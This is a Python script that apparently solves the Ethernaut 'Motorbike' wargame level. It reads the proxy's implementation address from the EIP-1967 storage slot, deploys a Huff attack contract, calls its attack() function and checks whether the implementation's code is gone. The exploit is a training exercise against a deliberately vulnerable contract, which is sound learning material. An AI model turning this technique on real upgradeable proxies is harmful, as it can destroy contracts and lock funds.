from ape import accounts
from ..utils.helper import (
    get_level_instance,
    level_completed,
    deploy_huff_contract,
    get_sig,
    send_tx,
    w3,
)

ETHERNAUT = "0xD2e5e0102E55a5234379DD796b8c641cd5996Efd"
LEVEL = "0x9b261b23cE149422DE75907C6ac0C30cEc4e652A"

IMPLEMENTATION_SLOT = 0x360894A13BA1A3210667C828492DB98DCA3E2076CC3735A920A3CA505D382BBC


def main():
    # setting up user
    user = accounts.test_accounts[0]

    # get level instance
    instance, ethernaut = get_level_instance(ETHERNAUT, LEVEL, user)

    # deploy hacker contract
    print("\n--- Huff Huff... Deploying hacker contract ---\n")
    implementation = w3.toChecksumAddress(
        w3.eth.get_storage_at(instance, IMPLEMENTATION_SLOT)[12:].hex()
    )
    hacker = deploy_huff_contract("Motorbike.huff", implementation, user)

    # exploit goes here
    print("\n--- Exploiting level instance ---\n")

    print(
        f"\n--- Code at implementation address before exploit: {w3.eth.get_code(implementation).hex()} ---\n"
    )
    send_tx(user, hacker, get_sig("attack()"))

    print(
        f"\n--- Code at implementation address after exploit: {w3.eth.get_code(implementation).hex()} ---\n"
    )

    # submiting level instance
    print("\n--- Submitting level instance ---\n")
    submit_tx = ethernaut.submitLevelInstance(instance, sender=user)

    # checking if level is completed
    level_completed(ethernaut, submit_tx, user.address, instance, LEVEL)

    print("\n--- 🥂!LEVEL COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
